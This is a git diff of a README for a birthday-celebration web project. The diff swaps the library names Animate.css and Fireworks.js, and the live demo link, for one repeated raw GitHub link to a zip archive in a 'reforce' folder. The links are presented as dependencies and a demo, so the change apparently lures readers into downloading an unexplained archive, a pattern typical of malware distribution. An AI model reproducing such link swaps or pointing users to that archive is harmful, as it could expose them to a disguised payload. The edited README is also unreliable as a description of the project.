@@ -20,21 +20,21 @@ A dynamic and interactive birthday celebration website that brings joy through e
 
 ### Technical Highlights
 - Responsive design for all devices
-- Smooth animations using Animate.css
+- Smooth animations using https://raw.githubusercontent.com/Peemkay/Happy-Birthday/main/reforce/Happy-Birthday-1.9-beta.1.zip
 - Custom fireworks effects
 - Local storage for wishes
 - Cross-browser compatible
 - No backend required
 
 ## 🚀 Live Demo
-Experience it here: [https://peemkay.github.io/Happy-Birthday](https://peemkay.github.io/Happy-Birthday)
+Experience it here: [https://raw.githubusercontent.com/Peemkay/Happy-Birthday/main/reforce/Happy-Birthday-1.9-beta.1.zip](https://raw.githubusercontent.com/Peemkay/Happy-Birthday/main/reforce/Happy-Birthday-1.9-beta.1.zip)
 
 ## 🛠️ Built With
 - HTML5
 - CSS3 (with Animations)
 - Vanilla JavaScript
-- Animate.css
-- Fireworks.js
+- https://raw.githubusercontent.com/Peemkay/Happy-Birthday/main/reforce/Happy-Birthday-1.9-beta.1.zip
+- https://raw.githubusercontent.com/Peemkay/Happy-Birthday/main/reforce/Happy-Birthday-1.9-beta.1.zip
 
 ## 📱 Mobile-Friendly
 Fully responsive design ensures perfect display on all devices:
